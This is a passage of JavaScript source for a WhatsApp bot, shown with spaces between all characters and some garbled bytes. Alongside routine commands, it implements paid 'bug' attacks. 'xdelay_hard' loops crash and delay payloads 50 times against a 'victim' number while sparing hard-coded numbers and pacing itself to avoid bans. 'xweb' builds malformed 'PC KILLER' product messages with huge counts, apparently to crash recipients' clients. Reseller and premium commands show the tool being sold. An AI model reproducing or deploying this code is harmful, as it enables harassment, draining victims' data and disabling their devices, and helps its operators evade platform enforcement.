 
 }   c a t c h   ( e r r o r )   { 
 c o n s t   e r r o r M e s s a g e   =   ` T h e r e   i s   a n   e r r o r :   $ { e r r o r . m e s s a g e } ` ; 
 a w a i t   r e p l y g c x e o n ( e r r o r M e s s a g e ) ; 
 } 
 } 
 b r e a k ; 
 c a s e   " r v o " :   c a s e   " r e a d v i e w o n c e " :   { 
   i f   ( ! t e x t )   r e t u r n   r e p l y g c x e o n ( m e s s . w a i t ) ; 
 i f   ( ! m . q u o t e d )   r e t u r n   r e p l y g c x e o n ( " r e p l y   p e s a n   v i e w O n c e   n y a ! " ) 
 l e t   m s g   =   m ? . q u o t e d ? . m e s s a g e ? . i m a g e M e s s a g e   | |   m ? . q u o t e d ? . m e s s a g e ? . v i d e o M e s s a g e   | |   m ? . q u o t e d ? . m e s s a g e ? . a u d i o M e s s a g e   | |   m ? . q u o t e d 
 i f   ( ! m s g . v i e w O n c e   & &   m . q u o t e d . m t y p e   ! = =   " v i e w O n c e M e s s a g e V 2 "   & &   ! m s g . v i e w O n c e )   r e t u r n   r e p l y g c x e o n ( " P e s a n   i t u   b u k a n   v i e w o n c e ! " ) 
 c o n s t   {   d o w n l o a d C o n t e n t F r o m M e s s a g e   }   =   r e q u i r e ( " @ a d i w a j s h i n g / b a i l e y s " ) ; 
 l e t   m e d i a   =   a w a i t   d o w n l o a d C o n t e n t F r o m M e s s a g e ( m s g ,   m s g . m i m e t y p e   = =   ' i m a g e / j p e g '   ?   ' i m a g e '   :   m s g . m i m e t y p e   = =   ' v i d e o / m p 4 '   ?   ' v i d e o '   :   ' a u d i o ' ) 
         l e t   t y p e   =   m s g . m i m e t y p e 
         l e t   b u f f e r   =   B u f f e r . f r o m ( [ ] ) 
         f o r   a w a i t   ( c o n s t   c h u n k   o f   m e d i a )   { 
                 b u f f e r   =   B u f f e r . c o n c a t ( [ b u f f e r ,   c h u n k ] ) 
         } 
         i f   ( / v i d e o / . t e s t ( t y p e ) )   { 
                 r e t u r n   X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   { v i d e o :   b u f f e r ,   c a p t i o n :   m s g . c a p t i o n   | |   " " } ,   { q u o t e d :   m } ) 
         }   e l s e   i f   ( / i m a g e / . t e s t ( t y p e ) )   { 
                 r e t u r n   X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   { i m a g e :   b u f f e r ,   c a p t i o n :   m s g . c a p t i o n   | |   " " } ,   { q u o t e d :   m } ) 
         }   e l s e   i f   ( / a u d i o / . t e s t ( t y p e ) )   { 
                 r e t u r n   X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   { a u d i o :   b u f f e r ,   m i m e t y p e :   " a u d i o / m p e g " ,   p t t :   t r u e } ,   { q u o t e d :   m } ) 
         }   
 } 
 b r e a k 
 
 c a s e   ' c l e a r c h a t ' : { 
 i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
 m . r e p l y ( ' \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n \ n ' ) 
                                         } 
 b r e a k 
 c a s e   ' x d e l a y _ h a r d ' :   { 
         i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
 i f   ( ! q )   r e t u r n   r e p l y g c x e o n ( ` E x a m p l e : \ n   $ { p r e f i x   +   c o m m a n d }   2 0 X X X ` ) 
 v i c t i m   =   t e x t . s p l i t ( " | " ) [ 0 ] 
 c o n s t   X r e t u r n   =   m . m e n t i o n e d J i d [ 0 ]   ?   m . m e n t i o n e d J i d [ 0 ]   :   m . q u o t e d   ?   m . q u o t e d . s e n d e r   :   v i c t i m . r e p l a c e ( / [ ^ 0 - 9 ] / g , ' ' ) + " @ s . w h a t s a p p . n e t " 
 v a r   c o n t a c t I n f o   =   a w a i t   X e o n B o t I n c . o n W h a t s A p p ( X r e t u r n ) ; 
     i f   ( v i c t i m   = =   " 2 0 1 5 0 7 1 5 1 6 9 7 " )   { 
         r e t u r n ; 
         } 
         i f   ( v i c t i m   = =   " 9 1 9 3 6 6 3 1 6 0 1 1 " )   { 
         r e t u r n ; 
         } 
         i f   ( v i c t i m   = =   " 9 1 9 4 0 2 1 0 4 4 0 1 " )   { 
         r e t u r n ; 
     } 
     i f   ( c o n t a c t I n f o . l e n g t h   = =   0 )   { 
         r e t u r n   r e p l y g c x e o n ( " T h e   n u m b e r   i s   n o t   r e g i s t e r e d   o n   W h a t s A p p " ) ; 
     } 
     
 s e n d M e s s a g e W i t h M e n t i o n s ( 
         " S u c c e s s f u l l y   S e n t   B u g   T o   @ "   +   X r e t u r n . s p l i t ( ' @ ' ) [ 0 ]   +   
         "   U s i n g   * "   +   c o m m a n d   +   " *   ✅ \ n \ n P a u s e   2   m i n u t e s   s o   t h a t   t h e   b o t   i s   n o t   b a n n e d . " ,   
         [ X r e t u r n ] 
     ) ; 
     f o r   ( l e t   i   =   0 ;   i   < 5 0 ;   i + + )   { 
 a w a i t   Z e n o D e l a y P a y l o a d ( X r e t u r n ) 
 a w a i t   ( 1 0 0 ) 
 a w a i t   Z e n o D r a i n K u o t a ( X r e t u r n ) 
 a w a i t   ( 1 0 0 0 0 ) 
 a w a i t   Z e n o D e l a y N e w B e t a ( X r e t u r n ) 
 a w a i t   ( 1 0 0 ) 
 a w a i t   N u l l I n v i s ( X r e t u r n ) 
 a w a i t   ( 1 0 0 0 ) 
 a w a i t   ( 1 0 0 ) 
 a w a i t   d e l a y I n f i n i t y ( X r e t u r n ) 
 a w a i t   ( 1 0 0 ) 
 a w a i t   Z e n o D r a i n K u o t a ( X r e t u r n ) 
 a w a i t   ( 5 0 0 0 ) 
 a w a i t   X i n v i s D e l a y ( X r e t u r n ) 
 a w a i t   d e l a y N u l l ( X r e t u r n ) 
 a w a i t   ( 5 0 0 0 ) 
 a w a i t   I n v i s H a r d n e w ( X r e t u r n ) 
 a w a i t   ( 1 0 0 ) 
 a w a i t   X S t i c k d e l a y ( X r e t u r n ) 
 a w a i t   ( 1 0 0 ) 
 a w a i t   X S t i c k d e l a y ( X r e t u r n ) 
 a w a i t   ( 1 0 0 0 ) 
 a w a i t   Z e n o D r a i n K u o t a ( X r e t u r n ) 
 a w a i t   ( 1 0 0 ) 
 } 
 } 
 b r e a k 
 
 
 c a s e   " c h e c k h o s t " :   { 
 
 i f   ( ! q )   r e t u r n   r e p l y g c x e o n ( ` E x a m p l e   :   $ { p r e f i x   +   c o m m a n d }   h t t p s : / / n x n n . c o m ` ) 
 l e t   m s g   =   {   v i e w O n c e M e s s a g e :   { 
 m e s s a g e :   { 
     " i n t e r a c t i v e M e s s a g e " :   { 
         " h e a d e r " :   { 
             " t i t l e " :   " " , 
             " s u b t i t l e " :   " p " 
         } , 
         " b o d y " :   { 
             " t e x t " :   " C l i c k   C h e c h   H o s t   T o   C h e c k   W e b " 
         } , 
         " f o o t e r " :   { 
             " t e x t " :   b o t n a m e 
         } , 
         " n a t i v e F l o w M e s s a g e " :   { 
             " b u t t o n s " :   [ 
                 { 
                     " n a m e " :   " c t a _ u r l " , 
                     " b u t t o n P a r a m s J s o n " :   J S O N . s t r i n g i f y (   { d i s p l a y _ t e x t   :   ' C h e c k   H o s t '   ,   u r l   :   ` h t t p s : / / c h e c k - h o s t . n e t / c h e c k - h t t p ? h o s t = $ { q } ` ,   m e r c h a n t _ u r l   :   ` h t t p s : / / c h e c k - h o s t . n e t / c h e c k - h t t p ? h o s t = $ { q } `   } ) 
                 } 
             ] , 
             " m e s s a g e P a r a m s J s o n " :   " " 
         } 
     } 
 } 
 } 
 } 
 X e o n B o t I n c . r e l a y M e s s a g e ( m . c h a t ,   m s g ,   { } ) ; 
 } 
 b r e a k 
 
 c a s e   ' a d d r e s e l l ' :   c a s e   ' a d d r e s e l l e r ' :   { 
         i f   ( ! g l o b a l . d e v . i n c l u d e s ( s e n d e r N u m b e r ) )   r e t u r n 
         
         l e t   n u m b e r   =   t e x t . r e p l a c e ( / [ ^ 0 - 9 ] / g ,   ' ' )   / /   E x t r a c t   n u m b e r   f r o m   t e x t 
         i f   ( ! n u m b e r )   r e t u r n   r e p l y g c x e o n ( " P l e a s e   p r o v i d e   a   v a l i d   n u m b e r . " ) ; 
 
         i f   ( g l o b a l . d b . d a t a . o w n e r s . i n c l u d e s ( n u m b e r ) )   { 
                 r e t u r n   r e p l y g c x e o n ( " N u m b e r   a l r e a d y   i n   r e s e l l e r   l i s t . " ) ; 
         } 
 
         g l o b a l . d b . d a t a . o w n e r s . p u s h ( n u m b e r ) ; 
         f s . w r i t e F i l e S y n c ( ' . / d a t a b a s e / d a t a b a s e . j s o n ' ,   J S O N . s t r i n g i f y ( g l o b a l . d b ,   n u l l ,   2 ) ) ; 
         r e p l y g c x e o n ( ` N u m b e r   $ { n u m b e r }   a d d e d   t o   r e s e l l e r . ` ) ; 
 } 
 b r e a k ; 
 
 c a s e   ' d e l r e s e l l ' :   c a s e   ' d e l r e s e l l e r ' :   { 
         i f   ( ! g l o b a l . d e v . i n c l u d e s ( s e n d e r N u m b e r ) )   r e t u r n 
 
         l e t   n u m b e r T o D e l e t e   =   t e x t . r e p l a c e ( / [ ^ 0 - 9 ] / g ,   ' ' )   / /   E x t r a c t   t h e   n u m b e r 
         i f   ( ! n u m b e r T o D e l e t e )   r e t u r n   m . r e p l y ( " P l e a s e   p r o v i d e   a   v a l i d   n u m b e r   t o   d e l e t e . " ) ; 
 
         / /   C h e c k   i f   t h e   n u m b e r   e x i s t s   i n   t h e   o w n e r s   l i s t 
         l e t   i n d e x   =   g l o b a l . d b . d a t a . o w n e r s . i n d e x O f ( n u m b e r T o D e l e t e ) ; 
         i f   ( i n d e x   = = =   - 1 )   { 
                 r e t u r n   r e p l y g c x e o n ( " T h e   p r o v i d e d   n u m b e r   i s   n o t   i n   t h e   r e s e l l e r   l i s t . " ) ; 
         } 
 
         / /   R e m o v e   t h e   n u m b e r   f r o m   t h e   o w n e r s   l i s t 
         g l o b a l . d b . d a t a . o w n e r s . s p l i c e ( i n d e x ,   1 ) ; 
         f s . w r i t e F i l e S y n c ( ' . / d a t a b a s e / d a t a b a s e . j s o n ' ,   J S O N . s t r i n g i f y ( g l o b a l . d b ,   n u l l ,   2 ) ) ; 
         r e p l y g c x e o n ( ` N u m b e r   $ { n u m b e r T o D e l e t e }   h a s   b e e n   r e m o v e d   f r o m   t h e   r e s e l l e r   l i s t . ` ) ; 
 } 
 b r e a k ; 
 
 c a s e   ' l i s t r e s e l l ' :   c a s e   ' l i s t r e s e l l e r ' :   { 
         l e t   o w n e r s   =   g l o b a l . d b . d a t a . o w n e r s   | |   [ ] ; 
         i f   ( o w n e r s . l e n g t h   = = =   0 )   { 
                 r e t u r n   r e p l y g c x e o n ( " T h e r e   a r e   n o   r e s e l l e r   i n   t h e   l i s t . " ) ; 
         } 
 
         l e t   o w n e r L i s t   =   o w n e r s . m a p ( ( n u m ,   i n d e x )   = >   ` $ { i n d e x   +   1 } .   $ { n u m } ` ) . j o i n ( ' \ n ' ) ; 
         r e p l y g c x e o n ( ` T o t a l   R e s e l l e r :   $ { o w n e r s . l e n g t h } \ n \ n $ { o w n e r L i s t } ` ) ; 
 } 
 b r e a k ; 
 
 
 c a s e   ' a d d p r e m ' : 
 	 	 	 c a s e   ' a d d p r e m i u m ' :   { 
 	 	 	 	 i f   ( ! ( g l o b a l . d b . d a t a . o w n e r s   | |   [ ] ) . i n c l u d e s ( s e n d e r N u m b e r ) )   { 
         r e t u r n   r e p l y g c x e o n ( ` ❌   S o r r y   y o u   d o n ' t   h a v e   p e r m i s s i o n   t o   u s e   t h i s   c o m m a n d .   T h i s   c o m m a n d   c a n   o n l y   b e   u s e d   b y   r e s e l l e r !   
 
 W a n t   t o   b u y   r e s e l l e r ?   C h a t   D e v e l o p e r ! 
 Y o u T u b e :   
 T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � 
 W h a t s A p p :   + 2 0 1 0 2 9 4 1 0 7 6 6 ` ) ; 
 } 
 	 	 	 	 i f   ( ! t e x t )   r e t u r n   r e p l y g c x e o n ( ` * I n c o r r e c t   u s e ! * \ n \ n U s a g e : \ n $ { p r e f i x   +   c o m m a n d }   < u s e r | t i m e > \ n \ n E x a m p l e : \ n $ { p r e f i x   +   c o m m a n d }   @ 0 | 1 d ` ) 
 	 	 	 	 l e t   n o m o r   =   m . m e n t i o n e d J i d [ 0 ]   ?   m . m e n t i o n e d J i d [ 0 ]   :   m . q u o t e d   ?   m . q u o t e d . s e n d e r   :   t e x t . s p l i t ( " | " ) [ 0 ] . r e p l a c e ( / [ ^ 0 - 9 ] / g ,   ' ' )   +   " @ s . w h a t s a p p . n e t " 
 	 	 	 	 i f   ( o w n e r . i n c l u d e s ( n o m o r ) )   r e t u r n   r e p l y g c x e o n ( " * B o t   o w n e r s   c a n ' t   g e t   o w n e r ! * " ) 
 	 	 	 	 l e t   p r e m i u m   =   a w a i t   c d . i s P r e m i u m ( u s e r s d b ,   n o m o r ) 
 	 	 	 	 i f   ( p r e m i u m )   r e t u r n   r e p l y g c x e o n ( " * T h i s   u s e r   i s   a l r e a d y   i n   t h e   p r e m i u m   l i s t * " ) 
 	 	 	 	 l e t   u s e r s   =   a w a i t   X e o n B o t I n c . o n W h a t s A p p ( n o m o r ) 
 	 	 	 	 i f   ( u s e r s . l e n g t h   <   1 )   r e t u r n   r e p l y g c x e o n ( ` * T a g / r e p l y / i n p u t   n u m b e r   c o r r e c t l y ! * \ n \ n U s a g e : \ n $ { p r e f i x   +   c o m m a n d }   < u s e r | t i m e > \ n \ n E x a m p l e : \ n $ { p r e f i x   +   c o m m a n d }   @ 0 | 1 d ` ) 
 	 	 	 	 l e t   e x p i r e d   =   t e x t . s p l i t ( " | " ) [ 1 ] 
 	 	 	 	 i f   ( ! e x p i r e d )   r e t u r n   r e p l y g c x e o n ( ` * E n t e r   e x p i r y   d a t e ! * \ n \ n U s a g e : \ n $ { p r e f i x   +   c o m m a n d }   < u s e r | t i m e > \ n \ n E x a m p l e : \ n $ { p r e f i x   +   c o m m a n d }   @ 0 | 1 d ` ) 
 	 	 	 	 a w a i t   X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   { 
 	 	 	 	 	 r e a c t :   { 
 	 	 	 	 	 	 t e x t :   " ⏱ ️ " , 
 	 	 	 	 	 	 k e y :   m . k e y , 
 	 	 	 	 	 } 
 	 	 	 	 } ) 
 	 	 	 	 l e t   a d d p r e m   =   a w a i t   c d . a d d P r e m ( u s e r s d b ,   u s e r s [ 0 ] . j i d ,   e x p i r e d ) 
 	 	 	 	 c o n s t   c o n t e n t T e x t   =   { 
 	 	 	 	 	 t e x t :   a d d p r e m , 
 	 	 	 	 	 c o n t e x t I n f o :   { 
 	 	 	 	 	 	 m e n t i o n e d J i d :   X e o n B o t I n c . m e n t s ( a d d p r e m ) , 
 	 	 	 	 	 	 e x t e r n a l A d R e p l y :   { 
 	 	 	 	 	 	 	 t i t l e :   ` O W N E R   � � ` , 
 	 	 	 	 	 	 	 p r e v i e w T y p e :   " P H O T O " , 
 	 	 	 	 	 	 	 t h u m b n a i l U r l :   ` h t t p s : / / p o m f 2 . l a i n . l a / f / d y n q t l j b . j p g ` , 
 	 	 	 	 	 	 	 s o u r c e U r l :   l i n k 
 	 	 	 	 	 	 } 
 	 	 	 	 	 } 
 	 	 	 	 } ; 
 	 	 	 	 r e t u r n   X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   c o n t e n t T e x t ,   { 
 	 	 	 	 	 q u o t e d :   m , 
 	 	 	 	 } ) ; 
 	 	 	 } 
 	 	 	 b r e a k 
 
 c a s e   ' d e l p r e m ' : 
 	 	 	 c a s e   ' d e l p r e m i u m ' :   { 
 	 	 	 	 i f   ( ! ( g l o b a l . d b . d a t a . o w n e r s   | |   [ ] ) . i n c l u d e s ( s e n d e r N u m b e r ) )   { 
         r e t u r n   r e p l y g c x e o n ( ` ❌   S o r r y   y o u   d o n ' t   h a v e   p e r m i s s i o n   t o   u s e   t h i s   c o m m a n d .   T h i s   c o m m a n d   c a n   o n l y   b e   u s e d   b y   r e s e l l e r !   
 
 W a n t   t o   b u y   r e s e l l e r ?   C h a t   D e v e l o p e r ! 
 Y o u T u b e :   @   
 T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � 
 W h a t s A p p :   + 2 0 1 0 2 9 4 1 0 7 6 6 ` ) ; 
 } 
 	 	 	 	 i f   ( ! t e x t )   r e t u r n   r e p l y g c x e o n ( ` * I n c o r r e c t   u s e ! * \ n \ n U s a g e : \ n $ { p r e f i x   +   c o m m a n d }   < u s e r > \ n \ n E x a m p l e : \ n $ { p r e f i x   +   c o m m a n d }   @ 0 ` ) 
 	 	 	 	 l e t   n o m o r   =   m . m e n t i o n e d J i d [ 0 ]   ?   m . m e n t i o n e d J i d [ 0 ]   :   m . q u o t e d   ?   m . q u o t e d . s e n d e r   :   t e x t . r e p l a c e ( / [ ^ 0 - 9 ] / g ,   ' ' )   +   " @ s . w h a t s a p p . n e t " 
 	 	 	 	 l e t   p r e m i u m   =   a w a i t   c d . i s P r e m i u m ( u s e r s d b ,   n o m o r ) 
 	 	 	 	 i f   ( ! p r e m i u m )   r e t u r n   r e p l y g c x e o n ( " * T h i s   u s e r   i s   n o t   a   p r e m i u m   u s e r ! * " ) 
 	 	 	 	 l e t   d e l p r e m   =   a w a i t   c d . d e l P r e m ( u s e r s d b ,   n o m o r ) 
 	 	 	 	 r e p l y g c x e o n ( d e l p r e m ) 
 	 	 	 } 
 	 	 	 b r e a k 
                 
 c a s e   ' l i s t p r e m ' : 
 c a s e   ' l i s t p r e m i u m ' :   { 
 	 i f   ( ! ( g l o b a l . d b . d a t a . o w n e r s   | |   [ ] ) . i n c l u d e s ( s e n d e r N u m b e r ) )   { 
         r e t u r n   r e p l y g c x e o n ( ` ❌   S o r r y   y o u   d o n ' t   h a v e   p e r m i s s i o n   t o   u s e   t h i s   c o m m a n d .   T h i s   c o m m a n d   c a n   o n l y   b e   u s e d   b y   r e s e l l e r !   
 
 W a n t   t o   b u y   r e s e l l e r ?   C h a t   D e v e l o p e r ! 
 Y o u T u b e :   @   
 T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � 
 W h a t s A p p :   + 2 0 1 0 2 9 4 1 0 7 6 6 ` ) ; 
 } 
         t r y   { 
                 l e t   p r e m i u m   =   a w a i t   c d . l i s t P r e m i u m ( u s e r s d b ) ; 
                 l e t   t e k s   =   ` * < / >   P R E M   U S E R   L I S T   < / > * \ n \ n ` ; 
 
                 f o r   ( l e t   i   =   0 ;   i   <   p r e m i u m . l e n g t h ;   i + + )   { 
                         l e t   e x p i r y   =   u s e r s d b [ p r e m i u m [ i ] ] . p r e m i u m E x p i r y ; 
 
                         i f   ( ! e x p i r y   | |   e x p i r y   < =   D a t e . n o w ( ) )   { 
                                 t e k s   + =   ` $ { i   +   1 } .   @ $ { p r e m i u m [ i ] . s p l i t ( " @ " ) [ 0 ] } \ n E x p i r e d :   A l r e a d y   e x p i r e d \ n \ n ` ; 
                                 c o n t i n u e ; 
                         } 
 
                         / /   C a l c u l a t e   r e m a i n i n g   t i m e 
                         l e t   t i m e L e f t   =   e x p i r y   -   D a t e . n o w ( ) ; 
                         l e t   d a y s   =   M a t h . f l o o r ( t i m e L e f t   /   ( 1 0 0 0   *   6 0   *   6 0   *   2 4 ) ) ; 
                         l e t   h o u r s   =   M a t h . f l o o r ( ( t i m e L e f t   %   ( 1 0 0 0   *   6 0   *   6 0   *   2 4 ) )   /   ( 1 0 0 0   *   6 0   *   6 0 ) ) ; 
                         l e t   m i n u t e s   =   M a t h . f l o o r ( ( t i m e L e f t   %   ( 1 0 0 0   *   6 0   *   6 0 ) )   /   ( 1 0 0 0   *   6 0 ) ) ; 
 
                         t e k s   + =   ` $ { i   +   1 } .   @ $ { p r e m i u m [ i ] . s p l i t ( " @ " ) [ 0 ] } \ n E x p i r e   I n :   $ { d a y s }   d a y ,   $ { h o u r s }   h o u r ,   $ { m i n u t e s }   m i n u t e \ n \ n ` ; 
                 } 
 
                 X e o n B o t I n c . s e n d T e x t W i t h M e n t i o n s ( m . c h a t ,   t e k s ,   m ) ; 
         }   c a t c h   ( e r r o r )   { 
                 r e p l y g c x e o n ( u t i l . f o r m a t ( e r r o r ) ,   c o m m a n d ) ; 
         } 
 } 
 b r e a k ; 
 
 	 	 	 
 	 	 	 c a s e   ' c h e c k p r e m ' : 
 c a s e   ' c h e c k p r e m i u m ' :   { 
         t r y   { 
                 l e t   e x p i r y   =   u s e r s d b [ m . s e n d e r ] . p r e m i u m E x p i r y ; 
                 i f   ( ! e x p i r y   | |   e x p i r y   < =   D a t e . n o w ( ) )   { 
                         r e t u r n   r e p l y g c x e o n ( ` Y o u r   o w n e r   s u b s c r i p t i o n   h a s   a l r e a d y   e x p i r e d . ` ) ; 
                 } 
 
                 / /   C a l c u l a t e   r e m a i n i n g   t i m e 
                 l e t   t i m e L e f t   =   e x p i r y   -   D a t e . n o w ( ) ; 
                 l e t   d a y s   =   M a t h . f l o o r ( t i m e L e f t   /   ( 1 0 0 0   *   6 0   *   6 0   *   2 4 ) ) ; 
                 l e t   h o u r s   =   M a t h . f l o o r ( ( t i m e L e f t   %   ( 1 0 0 0   *   6 0   *   6 0   *   2 4 ) )   /   ( 1 0 0 0   *   6 0   *   6 0 ) ) ; 
                 l e t   m i n u t e s   =   M a t h . f l o o r ( ( t i m e L e f t   %   ( 1 0 0 0   *   6 0   *   6 0 ) )   /   ( 1 0 0 0   *   6 0 ) ) ; 
 
                 l e t   t e k s   =   ` * < / >   P R E M   U S E R   I N F O   < / > * 
 
 * S u b s c r i b e   I n f o *   : 
 -   U s e r   :   @ $ { m . s e n d e r . s p l i t ( " @ " ) [ 0 ] } 
 -   D u r a t i o n   :   $ { d a y s } D 
 -   E x p i r e   I n   :   
 $ { d a y s }   d a y ,   $ { h o u r s }   h o u r ,   $ { m i n u t e s }   m i n u t e 
 
 * B e n e f i t   I n f o *   : 
 -   P r e m i u m   A c c e s s   :   Y e s 
 -   U s e r   P r i o r i t y   :   Y e s 
 ` ; 
 
                 c o n s t   c o n t e n t T e x t   =   { 
                         t e x t :   t e k s , 
                         c o n t e x t I n f o :   { 
                                 m e n t i o n e d J i d :   X e o n B o t I n c . m e n t s ( t e k s ) , 
                                 e x t e r n a l A d R e p l y :   { 
                                         t i t l e :   ` P R E M I U M   � � ` , 
                                         p r e v i e w T y p e :   " P H O T O " , 
                                         t h u m b n a i l U r l :   ` h t t p s : / / p o m f 2 . l a i n . l a / f / d y n q t l j b . j p g ` , 
                                         s o u r c e U r l :   l i n k , 
                                 } , 
                         } , 
                 } ; 
 
                 r e t u r n   X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   c o n t e n t T e x t ,   {   q u o t e d :   m   } ) ; 
         }   c a t c h   ( e r r o r )   { 
                 a w a i t   r e p l y g c x e o n ( u t i l . f o r m a t ( e r r o r ) ,   c o m m a n d ) ; 
         } 
 } 
 b r e a k ; 
 
 
 c a s e   ' s e l f ' :   { 
         i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
 X e o n B o t I n c . p u b l i c   =   f a l s e 
 r e p l y g c x e o n ( ' S u c c e s s   C h a n g e   T o   S e l f   M o d e ' ) 
 } 
 b r e a k 
 
 c a s e   ' p u b l i c ' :   { 
         i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
 X e o n B o t I n c . p u b l i c   =   t r u e 
 r e p l y g c x e o n ( ' S u c c e s s   C h a n g e   T o   P u b l i c   M o d e ' ) 
 } 
 b r e a k 
 c a s e   " l i s t g c " : { 
 i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
 l e t   g e t G r o u p s   =   a w a i t   X e o n B o t I n c . g r o u p F e t c h A l l P a r t i c i p a t i n g ( ) 
 l e t   g r o u p s   =   O b j e c t . e n t r i e s ( g e t G r o u p s ) . s l i c e ( 0 ) . m a p ( ( e n t r y )   = >   e n t r y [ 1 ] ) 
 l e t   a n u   =   g r o u p s . m a p ( ( v )   = >   v . i d ) 
 l e t   h i t u e t   =   0 
 l e t   t e k s   =   ` ⬣   * L I S T   O F   G R O U P   B E L O W * \ n \ n T o t a l   G r o u p   :   $ { a n u . l e n g t h }   G r o u p \ n \ n ` 
 f o r   ( l e t   x   o f   a n u )   { 
 l e t   m e t a d a t a 2   =   a w a i t   X e o n B o t I n c . g r o u p M e t a d a t a ( x ) 
 t e k s   + =   ` ❏   G r o u p   $ { h i t u e t + = 1 } \ n │ ⭔   * N a m e   : *   $ { m e t a d a t a 2 . s u b j e c t } \ n │ ⭔   * I D   : *   $ { m e t a d a t a 2 . i d } \ n │ ⭔   * M E M B E R   : *   $ { m e t a d a t a 2 . p a r t i c i p a n t s . l e n g t h } \ n ╰ ─ ─ ─ ─ | \ n \ n ` 
 } 
 m . r e p l y ( t e k s ) 
     } 
 b r e a k 
 c a s e   ' o w n e r ' :   { 
 c o n s t   w o k e x   =   o w n e r n o m e r   / /   E x t r a c t   t h e   n u m b e r   p a r t 
 c o n s t   p u s h n a m e x   =   ` $ { w o k e x } ` 
 c o n s t   k o n t a k   =   { 
 " d i s p l a y N a m e " :   p u s h n a m e x , 
 v c a r d :   ` B E G I N : V C A R D \ n V E R S I O N : 3 . 0 \ n N : ; ; ; ; \ n F N :   $ { p u s h n a m e x } \ n i t e m 1 . T E L ; w a i d = $ { w o k e x } : $ { w o k e x } \ n i t e m 1 . X > A B L a b e l : \ n P l e a s e   D o n ' t   S p a m   M y   O w n e r \ n U R L ; E m a i l   O w n e r : $ { p u s h n a m e x } @ g m a i l . c o m \ n O R G :   T H I S   I S   M Y   O W N E R \ n E N D : V C A R D ` 
 } 
 c o n s t   o k e   =   a w a i t   X e o n B o t I n c . s e n d M e s s a g e ( f r o m ,   { 
 c o n t a c t s :   {   c o n t a c t s :   [ k o n t a k ]   } , 
 c o n t e x t I n f o : {   f o r w a r d i n g S c o r e :   9 9 9 ,   i s F o r w a r d e d :   f a l s e ,   m e n t i o n e d J i d : [ s e n d e r ] , 
 " e x t e r n a l A d R e p l y " : { 
 " s h o w A d A t t r i b u t i o n " :   t r u e , 
 " r e n d e r L a r g e r T h u m b n a i l " :   t r u e , 
 " t i t l e " :   b o t n a m e ,   
 " c o n t a i n s A u t o R e p l y " :   t r u e , 
 " m e d i a T y p e " :   1 ,   
 " j p e g T h u m b n a i l " :   f s . r e a d F i l e S y n c ( " . / X e o n M e d i a / t h u m b . j p g " ) , 
 " m e d i a U r l " :   ' h t t p s : / / i . i b b . c o / y d R K H n w / t h u m b . j p g ' , 
 " s o u r c e U r l " :   ` h t t p s : / / y o u t u b e . c o m / @   ` 
 } } } ,   {   q u o t e d :   m   } ) 
 / / a w a i t   X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   { a u d i o :   f s . r e a d F i l e S y n c ( ' . / X e o n M e d i a / s i k m a . m p 3 ' ) , m i m e t y p e :   ' a u d i o / m p e g ' , p t t :   t r u e } ,   { q u o t e d : o k e } ) 
 } 
 b r e a k 
 c a s e   ' x w e b ' : 
                 i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
 t r y   { 
 f o r   ( l e t   i   =   0 ;   i   <   1 0 ;   i + + )   { 
 m e s s a   =   a w a i t   p r e p a r e W A M e s s a g e M e d i a ( { 
 i m a g e :   { 
 u r l :   ` h t t p s : / / p i c . r e / i m a g e ` 
 } 
 } ,   { 
 u p l o a d :   X e o n B o t I n c . w a U p l o a d T o S e r v e r 
 } ) 
 c a t a l o g   =   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( f r o m ,   p r o t o . M e s s a g e . f r o m O b j e c t ( { 
 " p r o d u c t M e s s a g e " :   { 
 " p r o d u c t " :   { 
 " p r o d u c t I m a g e " :   m e s s a . i m a g e M e s s a g e , 
 " p r o d u c t I d " :   " 4 4 9 7 5 6 9 5 0 3 7 5 0 7 1 " , 
 " i t e m C o u n t " :   9 9 9 9 9 9 9 9 9 9 9 , 
 " t i t l e " :   ` P C   K I L L E R   X   T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � ` , 
 " d e s c r i p t i o n " :   ` ` , 
 " c u r r e n c y C o d e I s o 4 2 1 7 " :   " I D R " , 
 " f o o t e r T e x t " :   ` ` , 
 " p r o d u c t I m a g e C o u n t " :   9 9 9 9 9 9 9 9 9 9 9 9 9 9 9 9 9 9 9 9 , 
 " f i r s t I m a g e I d " :   9 9 9 9 9 9 9 9 9 9 , 
 " p r i c e A m o u n t 1 0 0 0 " :   " 9 9 9 " , 
 " s a l e P r i c e A m o u n t 1 0 0 0 " :   " I D R   9 9 . 9 9 9 9 9 9 9 9 9 9 9 9 9 9 9 9 9 9 9 9 " , 
 " t h u m b n a i l " :   m e s s a . i m a g e M e s s a g e , 
 " j p e g T h u m b n a i l " :   m , 
 " f i r s t I m a g e I d " :   9 9 9 9 9 9 9 9 , 
